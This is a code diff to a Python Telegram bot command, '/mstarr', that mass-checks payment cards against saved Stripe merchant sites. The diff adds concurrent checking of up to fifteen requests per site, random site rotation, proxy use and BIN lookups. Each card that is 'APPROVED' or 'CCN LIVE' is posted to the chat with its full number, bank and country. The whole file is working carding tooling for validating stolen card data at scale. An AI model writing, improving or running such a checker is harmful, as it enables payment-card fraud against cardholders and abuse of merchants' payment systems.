@@ -1,12 +1,15 @@
 """
 Stripe Auto Auth - Mass Check (/mstarr)
 =======================================
-Mass card check using user's saved Stripe Auth site. Reply to message with cards or /mstarr (paste cards).
+Mass card check with asyncio concurrency. Threads = sites * 15, capped by card count.
+Uses random saved site per card. Approved/CCN live sent as separate messages (same as /msh and /mau).
 """
 
 import re
+import random
 import asyncio
 from time import time
+from datetime import datetime
 
 from pyrogram import Client, filters
 from pyrogram.enums import ParseMode
@@ -19,7 +22,14 @@ from BOT.tools.proxy import get_rotating_proxy
 from BOT.Auth.StripeAuto.api import auto_stripe_auth
 from BOT.Auth.StripeAuto.response import determine_stripe_auto_status
 
+try:
+    from TOOLS.getbin import get_bin_details
+except ImportError:
+    def get_bin_details(_):
+        return None
+
 user_locks = {}
+CONCURRENCY_PER_SITE = 15  # max concurrent tasks per saved site
 
 def extract_cards(text: str):
     return re.findall(r"(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})", text)
@@ -88,58 +98,139 @@ async def handle_mstarr_command(client: Client, message):
             )
         proxy = get_rotating_proxy(int(user_id))
         total = len(all_cards)
-        site_label = f"{len(sites)} site(s)" if len(sites) > 1 else (sites[0].get("url", "")[:35] if isinstance(sites[0], dict) else str(sites[0])[:35])
+        sites_list = [
+            s.get("url", "") if isinstance(s, dict) else str(s)
+            for s in sites
+            if (s.get("url") if isinstance(s, dict) else str(s))
+        ]
+        if not sites_list:
+            user_locks.pop(user_id, None)
+            return await message.reply(
+                "<pre>No valid site URL ❌</pre>",
+                reply_to_message_id=message.id,
+                parse_mode=ParseMode.HTML,
+            )
+        # Concurrency: sites * 15 threads, capped by card count — no blank requests
+        max_concurrent = min(len(sites_list) * CONCURRENCY_PER_SITE, total)
+        semaphore = asyncio.Semaphore(max_concurrent)
+        site_label = f"{len(sites_list)} site(s)" if len(sites_list) > 1 else (sites_list[0][:35] if sites_list else "")
         status_msg = await message.reply(
-            f"<pre>Stripe Auto Mass ◐</pre>\n<b>Cards:</b> <code>{total}</code>\n<b>Sites:</b> <code>{site_label}...</code>\n<b>Status:</b> <i>Processing...</i>",
+            f"<pre>Stripe Auto Mass ◐</pre>\n<b>Cards:</b> <code>{total}</code>\n<b>Sites:</b> <code>{site_label}...</code>\n<b>Threads:</b> <code>{max_concurrent}</code>\n<b>Status:</b> <i>Processing...</i>",
             reply_to_message_id=message.id,
             parse_mode=ParseMode.HTML,
         )
+        user_data = users.get(user_id, {})
+        plan = user_data.get("plan", {}).get("plan", "Free")
+        badge = user_data.get("plan", {}).get("badge", "🧿")
+        checked_by = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name or 'User'}</a>" if message.from_user else "User"
+
+        async def process_one(card: str, site_url: str, index: int):
+            async with semaphore:
+                try:
+                    res = await auto_stripe_auth(site_url, card, session=None, proxy=proxy, timeout_seconds=45)
+                    status = determine_stripe_auto_status(res)
+                    return (index, card, status, res)
+                except Exception as e:
+                    return (index, card, "ERROR", {"message": str(e)[:80]})
+
+        def build_hit_message(card: str, status: str, res: dict) -> str:
+            header = "APPROVED" if status == "APPROVED" else "CCN LIVE"
+            status_text = "Stripe Auth 0.0$ ✅" if status == "APPROVED" else "CCN Live ⚡"
+            cc_num = card.split("|")[0] if "|" in card else card
+            try:
+                bin_data = get_bin_details(cc_num[:6]) if get_bin_details else None
+                if bin_data:
+                    vendor = bin_data.get("vendor", "N/A")
+                    card_type = bin_data.get("type", "N/A")
+                    bank = bin_data.get("bank", "N/A")
+                    country = f"{bin_data.get('country', 'N/A')} {bin_data.get('flag', '')}"
+                else:
+                    vendor = card_type = bank = country = "N/A"
+            except Exception:
+                vendor = card_type = bank = country = "N/A"
+            msg_display = (res.get("message") or "")[:80] if isinstance(res.get("message"), str) else "N/A"
+            return f"""<b>[#StripeAuto] | {header}</b> ✦
+━━━━━━━━━━━━━━━
+<b>[•] Card:</b> <code>{card}</code>
+<b>[•] Gateway:</b> <code>Stripe Auth</code>
+<b>[•] Status:</b> <code>{status_text}</code>
+<b>[•] Response:</b> <code>{msg_display}</code>
+━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
+<b>[+] BIN:</b> <code>{cc_num[:6]}</code>
+<b>[+] Info:</b> <code>{vendor} - {card_type}</code>
+<b>[+] Bank:</b> <code>{bank}</code> 🏦
+<b>[+] Country:</b> <code>{country}</code>
+━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
+<b>[ﾒ] Checked By:</b> {checked_by} [<code>{plan} {badge}</code>]
+<b>[ϟ] Dev:</b> <a href="https://t.me/Chr1shtopher">Chr1shtopher</a>
+━━━━━━━━━━━━━"""
+
         start_time = time()
-        results = []
-        done = 0
-        for i, card in enumerate(all_cards):
-            site_entry = sites[i % len(sites)]
-            site_url = site_entry.get("url", "") if isinstance(site_entry, dict) else str(site_entry)
-            res = await auto_stripe_auth(site_url, card, session=None, proxy=proxy, timeout_seconds=45)
-            status = determine_stripe_auto_status(res)
-            msg = res.get("message", "") if isinstance(res.get("message"), str) else str(res.get("message", ""))[:40]
-            results.append((card, status, msg[:40]))
-            done += 1
-            if done % 5 == 0 or done == total:
+        # One task per card; each card gets a random saved site — no blank requests
+        tasks = [
+            process_one(card, random.choice(sites_list), i)
+            for i, card in enumerate(all_cards)
+        ]
+        done_count = 0
+        approved_count = 0
+        ccn_count = 0
+        declined_count = 0
+        for coro in asyncio.as_completed(tasks):
+            try:
+                index, card, status, res = await coro
+            except Exception:
+                done_count += 1
+                if done_count % 5 == 0 or done_count == total:
+                    try:
+                        await status_msg.edit_text(
+                            f"<pre>Stripe Auto Mass ◐</pre>\n<b>Cards:</b> <code>{total}</code>\n<b>Done:</b> <code>{done_count}/{total}</code>\n<b>✅ Approved:</b> <code>{approved_count}</code> <b>⚡ CCN:</b> <code>{ccn_count}</code>\n<b>Status:</b> <i>Processing...</i>",
+                            parse_mode=ParseMode.HTML,
+                        )
+                    except Exception:
+                        pass
+                continue
+            done_count += 1
+            if status == "APPROVED":
+                approved_count += 1
+            elif status == "CCN LIVE":
+                ccn_count += 1
+            elif status == "DECLINED":
+                declined_count += 1
+            if status in ("APPROVED", "CCN LIVE"):
+                try:
+                    hit_message = build_hit_message(card, status, res)
+                    await message.reply(hit_message, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+                except Exception:
+                    pass
+            if done_count % 5 == 0 or done_count == total:
                 try:
                     await status_msg.edit_text(
-                        f"<pre>Stripe Auto Mass ◐</pre>\n<b>Cards:</b> <code>{total}</code>\n<b>Done:</b> <code>{done}/{total}</code>\n<b>Status:</b> <i>Processing...</i>",
+                        f"<pre>Stripe Auto Mass ◐</pre>\n<b>Cards:</b> <code>{total}</code>\n<b>Done:</b> <code>{done_count}/{total}</code>\n<b>✅ Approved:</b> <code>{approved_count}</code> <b>⚡ CCN:</b> <code>{ccn_count}</code>\n<b>Status:</b> <i>Processing...</i>",
                         parse_mode=ParseMode.HTML,
                     )
                 except Exception:
                     pass
+
         time_taken = round(time() - start_time, 2)
-        approved = sum(1 for _, s, _ in results if s == "APPROVED")
-        ccn = sum(1 for _, s, _ in results if s == "CCN LIVE")
-        declined = sum(1 for _, s, _ in results if s == "DECLINED")
-        err = total - approved - ccn - declined
-        lines = [
-            f"<pre>Stripe Auto Mass ✅</pre>",
-            "━━━━━━━━━━━━━",
-            f"<b>• Total:</b> <code>{total}</code>",
-            f"<b>• Approved:</b> <code>{approved}</code> ✅",
-            f"<b>• CCN Live:</b> <code>{ccn}</code> ⚡",
-            f"<b>• Declined:</b> <code>{declined}</code> ❌",
-            f"<b>• Error:</b> <code>{err}</code>",
-            "━━━━━━━━━━━━━",
-            f"<b>• Time:</b> <code>{time_taken}s</code>",
-        ]
-        live_lines = []
-        for card, status, msg in results:
-            if status in ("APPROVED", "CCN LIVE"):
-                live_lines.append(f"<code>{card}</code> → {status}")
-        if live_lines:
-            lines.append("\n<b>Live:</b>")
-            lines.extend(live_lines[:15])
-            if len(live_lines) > 15:
-                lines.append(f"<i>+{len(live_lines) - 15} more</i>")
+        err_count = total - approved_count - ccn_count - declined_count
+        current_time = datetime.now().strftime("%I:%M %p")
+
+        completion_message = f"""<pre>✦ Stripe Auto Check Completed</pre>
+━━━━━━━━━━━━━━━
+🟢 <b>Total CC</b>     : <code>{total}</code>
+💬 <b>Progress</b>    : <code>{done_count}/{total}</code>
+✅ <b>Approved</b>    : <code>{approved_count}</code>
+⚡ <b>CCN Live</b>    : <code>{ccn_count}</code>
+❌ <b>Declined</b>    : <code>{declined_count}</code>
+⚠️ <b>Errors</b>      : <code>{err_count}</code>
+━━━━━━━━━━━━━
+⏱️ <b>Time Elapsed</b> : <code>{time_taken}s</code>
+👤 <b>Checked By</b> : {checked_by} [<code>{plan} {badge}</code>]
+🔧 <b>Dev</b>: <a href="https://t.me/Chr1shtopher">Chr1shtopher</a> <code>{current_time}</code>
+━━━━━━━━━━━━━"""
+
         await status_msg.edit_text(
-            "\n".join(lines),
+            completion_message,
             parse_mode=ParseMode.HTML,
             disable_web_page_preview=True,
         )
